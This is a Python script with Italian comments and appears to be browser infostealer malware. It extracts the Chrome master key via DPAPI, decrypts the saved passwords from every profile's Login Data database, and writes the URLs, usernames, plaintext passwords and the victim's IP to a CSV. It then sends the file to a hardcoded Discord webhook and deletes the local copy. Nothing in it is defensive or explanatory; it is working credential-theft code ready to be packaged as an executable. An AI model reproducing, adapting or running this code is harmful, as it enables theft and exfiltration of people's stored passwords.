import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import discord
import socket
# Determina la cartella di base corretta (funziona sia da script che da eseguibile PyInstaller)
if getattr(sys, 'frozen', False):
    base_path = os.path.dirname(sys.executable)
else:
    base_path = os.path.dirname(os.path.abspath(__file__))

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
webhook_url = "https://discord.com/api/webhooks/1569675930224431234/d7q_3nMmRgejnAySBG4R5ARJFmlDOYWWXiukdGLzc6pG4yvJTSQjmSrVzCUWDz9cXUhx"
def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Rimuove il prefisso DPAPI
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(f"[ERR] Impossibile trovare la secret key di Chrome: {e}")
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        # Estrae il vettore di inizializzazione (IV) e il payload cifrato
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        
        cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password).decode('utf-8')
        return decrypted_pass
    except Exception as e:
        # In caso di errore restituisce stringa vuota o traccia l'errore
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        temp_db = os.path.join(base_path, "Loginvault.db")
        shutil.copy2(chrome_path_login_db, temp_db)
        return sqlite3.connect(temp_db)
    except Exception as e:
        print(f"[ERR] Impossibile copiare il database di Chrome: {e}")
        return None

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip
        
if __name__ == '__main__':
    try:
        csv_path = os.path.join(base_path, 'decrypted_password.csv')
        current_ip = get_local_ip()  # Ottiene l'IPv4 locale una volta sola all'avvio
        
        with open(csv_path, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            # Aggiunta di "ip" all'intestazione
            csv_writer.writerow(["index", "url", "username", "password", "ip"])
            
            secret_key = get_secret_key()
            if not secret_key:
                print("[ERR] Impossibile procedere senza la chiave di cifratura.")
                sys.exit(1)

            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]
            
            total_index = 0
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                if not os.path.exists(chrome_path_login_db):
                    continue
                    
                conn = get_db_connection(chrome_path_login_db)
                if secret_key and conn:
                    cursor = conn.cursor()
                    try:
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for login in cursor.fetchall():
                            url = login[0]
                            username = login[1]
                            ciphertext = login[2]
                            
                            if url != "" and username != "" and ciphertext != "":
                                decrypted_password = decrypt_password(ciphertext, secret_key)
                                # Inserisce l'IP alla fine della riga
                                csv_writer.writerow([total_index, url, username, decrypted_password, current_ip])
                                total_index += 1
                    except Exception as ex:
                        print(f"[ERR] Errore durante la lettura della tabella logins: {ex}")
                    finally:
                        cursor.close()
                        conn.close()
                        
                        temp_db = os.path.join(base_path, "Loginvault.db")
                        if os.path.exists(temp_db):
                            try:
                                os.remove(temp_db)
                            except:
                                pass
                                
        print(cinoma := f"Processo completato! File salvato in: {csv_path}")
        
        # Invio del webhook con allegato il CSV e pulizia automatica (senza cestino)
        try:
            webhook = discord.SyncWebhook.from_url(webhook_url)
            with open(csv_path, "rb") as f:
                discord_file = discord.File(f, filename="decrypted_password.csv")
                webhook.send(
                    content=f"Processo completato dalla macchina con IP: `{current_ip}`. Ecco il file:",
                    file=discord_file
                )
            print("[INFO] Messaggio e file inviati con successo su Discord!")
        except Exception as web_err:
            print(f"[ERR] Errore nell'invio del webhook: {web_err}")
        finally:
            if os.path.exists(csv_path):
                try:
                    os.remove(csv_path)
                    print("[INFO] File CSV eliminato definitivamente.")
                except Exception as del_err:
                    print(f"[ERR] Impossibile eliminare il file: {del_err}")
                    
    except Exception as e:
        print(f"[ERR critico] {e}")